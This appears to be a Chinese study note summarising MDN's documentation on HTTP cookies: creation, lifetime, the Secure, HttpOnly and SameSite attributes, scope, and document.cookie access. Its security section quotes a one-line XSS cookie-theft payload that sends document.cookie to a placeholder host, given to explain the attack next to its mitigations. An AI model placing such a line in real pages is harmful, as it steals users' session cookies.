# HTTP cookies

> [HTTP cookies \- HTTP \| MDN](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies)

HTTP cookie（又叫 web cookie 或 浏览器 cookie），是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。

通常，它用于高速服务端两个请求是否来自同一浏览器，比如保持用户的登录状态。

Cookie 使基于无状态的 HTTP 协议记录稳定的状态信息成为了可能。

Cookie 主要用于以下三个方面：

- 会话状态管理（如登录状态、购物车、游戏分数等）
- 个性化设置（如用户自定义设置、主题等）
- 浏览器行为追踪（如跟踪分析用户行为等）

## 创建 Cookie

服务器使用 `Set-Cookie` 响应头部向用户代理发送 Cookie 信息。

```
Set-Cookie: <cookie 名>=<cookie值>
```

可以使用多个 Set-Cookie 头来设置多个 Cookie。

Cookie 的过期时间、域、路径、有效期、适用站点都可以根据需要来指定。

当浏览器发起请求时，会将之前保存的额 Cookie 信息通过 Cookie 请求头部发送给服务器。

## 定义 Cookie 的生命周期

- 会话期 Cookie：仅在会话期生效。不需要指定过期时间（Expires）或有效期（Max-Age）。（但有的浏览器提供会话恢复功能，这样即使关闭浏览器也会保留会话期 Cookie，导致生命周期无限期延长）
- 持久性 Cookie：由过期时间（Expires）或有效期（Max-Age）指定一段时间。

## 限制访问 Cookie

- `Secure` 属性：标记 Secure 的 Cookie 只应通过被 HTTPS 协议加密过的请求发送给服务端，因此可以预防中间人攻击。（即使使用了 Secure，使用 Cookie 传输敏感信息也是不够安全的）

- `HttpOnly`属性：document.cookie 无法访问带有 HttpOnly 的 Cookie，此类 Cookie 仅作用域服务器。此预防措施有助于缓解 跨站脚本（XSS）攻击（避免js读取和操作 cookie）。

## Cookie 的作用域

- Domain 属性：指定了哪些主机可以接受 Cookie。如果不指定，默认 origin，不包含子域名。如果指定了 Domain，则一般包含子域名。

- Path 属性：指定了主机下的哪些路径可以接受 Cookie。（该 URL 路径必须存在于请求 URL 中）。以 "/" 作为路径分隔符，子路径也会被匹配。

- SameSite 属性：允许服务器要求某个 cookie 在跨站请求时不会被发送，从而阻止跨站请求伪造攻击（CSRF）。

SameSite 的值：

- None。不限制，同站、跨站请求下都会发送 cookies。
- Strict。浏览器只在访问相同站点时发送 cookies。
- Lax。与 Strict 类似，但用户从外部站点导航至 URL 时（例如荣国链接）除外。

## JS 通过 document.cookie 访问 Cookie

document.cookie 其实是 get/set 访问器，可以访问非 HttpOnly 标记的 cookie，也可以使用赋值的方式创建新的 Cookie。

如果要删除 cookie，可以用赋值但修改 Expires/Max-Age 的方式使 cookie 过期，从而达到删除的效果。

## 安全

- 跨站脚本攻击（XSS）：借助 document.cookie 窃取 cookie。

```js
(new Image()).src = "http://xxx.com/eval.php?cookie=" + document.cookie
```

- 跨站请求伪造（CSRF）
  - 对用户输入进行过滤来组织 XSS
  - 任何敏感操作都要确认
  - 用于敏感信息的 Cookie 只能拥有较短的生命周期
  - 设置 SameSite